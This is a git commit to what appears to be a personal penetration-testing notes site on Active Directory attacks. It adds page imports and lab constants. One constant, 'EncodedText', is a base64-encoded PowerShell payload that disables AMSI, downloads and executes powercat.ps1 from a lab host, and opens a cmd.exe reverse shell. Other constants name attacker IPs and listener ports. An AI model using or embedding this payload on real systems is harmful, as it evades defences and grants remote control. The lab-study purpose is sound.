88b3f110bd853fabaa71f830e4688699d3a9f92a
tkokhing <tkokhing@gmail.com>
2026-01-09 01:10:07 +0800

    Build up notes on AD and plan out constants listing

--- src/app/heptagoning/kill-chain/active_dir/[slug]/page.tsx
+++ src/app/heptagoning/kill-chain/active_dir/[slug]/page.tsx
@@ -7,7 +7,7 @@ import { PostBody } from "@/app/_components/post_gen/post-body";
 import { getPostBySlug } from "@/lib/share/api";
 import { generatePageMetadata } from "@/lib/share/generatePageMetadata";
 import { generatePageStaticParams } from "@/lib/share/generatePageStaticParams";
-import { AD_Access, AD_Overview, AD_Enum_powerview, AD_Kerberos, AD_Lateral_move } from "@/lib/_data_exporter/data_kiil-chain/kill-chain_exporter";
+import { AD_Access, AD_Enum_net_command, AD_Enum_powerview, AD_Exploit_attack, AD_Kerberos, AD_As_rep_roast, AD_Lateral_move, AD_Pass_the_hash, AD_Overpass_the_hash, AD_Netexec } from "@/lib/_data_exporter/data_kiil-chain/kill-chain_exporter";
 import Alert from "@/app/_components/blog_frame/alert";
 import Note from "@/app/_components/blog_frame/note";
 import Tip from "@/app/_components/blog_frame/tip";
@@ -29,10 +29,15 @@ export default async function Post(props: Params) {
     Alert,
     ToggleFrame,
     AD_Access,
-    AD_Overview,
+    AD_Enum_net_command,
     AD_Enum_powerview,
+    AD_Exploit_attack,
     AD_Kerberos,
+    AD_As_rep_roast,
     AD_Lateral_move,
+    AD_Pass_the_hash,
+    AD_Overpass_the_hash,
+    AD_Netexec,
   };
   const post = getPostBySlug(params.slug, MDX_FOLDER);
   if (!post || post.subPath != 'heptagoning/kill-chain/active_dir') return notFound();
--- src/lib/share/constants.ts
+++ src/lib/share/constants.ts
@@ -6,17 +6,13 @@ export const REPO_NAME = ""; // for future expansion use
 export const T_ANI_GIF_URL = `${LOGO_PATH}/tkokhing.gif`;
 export const TKOKHING_LOGO_SVG_URL = `${LOGO_PATH}/tkokhing.svg`;
 
-// For all sites
-export const VICTIM1_IP = "172.17.0.5";
-export const VICTIM1_PORT = "8080";
-export const ATTACKER_IP = "192.168.137.19";
-export const ATTACKER_PORT = "4444";
+
 
 // AD Setup
 
 // export const MS01_IP_EXT = "192.168.118.173";
 // export const MS01_IP_INT = "172.16.242.173";
-// export const MS01_PORT_FORWARD = "4444";
+// export const MS01_FORWARD_PORT_2 = "4444";
 
 // // // for kerberoasted service 
 // export const RUNNING_SPN = "svc-auth";
@@ -31,19 +27,43 @@ export const ATTACKER_PORT = "4444";
 // export const DC01_IP = "172.16.242.162";
 // export const DC01_PORT_FORWARD = "4442";
 
+
+export const ATTACKER_IP = "192.168.118.10";
+export const ATTACKER_PORT = "4444";
+
+// // Client01 (aka MS01) Browser Viewing
+// // - Internal (172.16.242.173)
 export const MS01_IP_EXT = "192.168.118.173";
 export const MS01_IP_INT = "172.16.242.173";
-export const MS01_PORT_FORWARD = "4444";
-
-// // for kerberoasted service 
-export const RUNNING_SPN = "svc-auth";
-
-// // EncodedText for SCSHELL
-export const EncodedText = "encoded_text_for_scshell"
+export const MS01_FORWARD_PORT_1 = "80";   // To download <u>PowerCat</u>
+export const MS01_FORWARD_PORT_2 = "4444"; // To open <u>reverse shell</u>
 
 
+// // WEB01 (aka MS02) Terminal
+// // - Internal (172.16.242.176)
 export const MS02_IP_INT = "172.16.242.176";
 export const MS02_PORT_FORWARD = "4443";
 
+
 export const DC01_IP = "172.16.242.162";
 export const DC01_PORT_FORWARD = "4442";
+
+export const AD_ATTACKER_IP = ATTACKER_IP;
+export const AD_ATTACKER_LISTEN_PORT_1 = "80";  // To facilitate pulling of <u>PowerCat</u>
+export const AD_ATTACKER_LISTEN_PORT_2 = "443"; // To facilitate incoming <u>reverse shell</u> 
+
+
+// // for kerberoasted service 
+export const RUNNING_SPN = "svc-auth";
+export const RUNNING_SPN_HASH = "hashhashashashverylong";
+export const RUNNING_SPN_PASSWORD = "pas$word";
+
+
+// // EncodedText for SCSHELL
+// // // // export const EncodedText = "please_update_encoded_text_for_scshell"
+export const EncodedText = "WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACIAKwAkACgAIgA0ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA1ADUAIAA3ADQAIAA2ADkAIAA2AEMAIAA3ADMAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAArACQAXwB9ADsAJAByAGUAcwB1AGwAdAApACkALgBHAGUAdABGAGkAZQBsAGQAKAAkACgAIgA2ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA0ADkAIAA2AEUAIAA2ADkAIAA3ADQAIAA0ADYAIAA2ADEAIAA2ADkAIAA2AEMAIAA2ADUAIAA2ADQAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0ADIAPQAkAHIAZQBzAHUAbAB0ADIAKwAkAF8AfQA7ACQAcgBlAHMAdQBsAHQAMgApACwAIgBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACIAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAIABpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgA0ADIALgAxADcAMwAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA3ADIALgAxADYALgAyADQAMgAuADEANwAzACAALQBwACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA"
+
+
+// For all sites VICTIM TAGGING
+export const VICTIM1_IP = MS01_IP_EXT;
+export const VICTIM1_PORT = MS01_FORWARD_PORT_2;
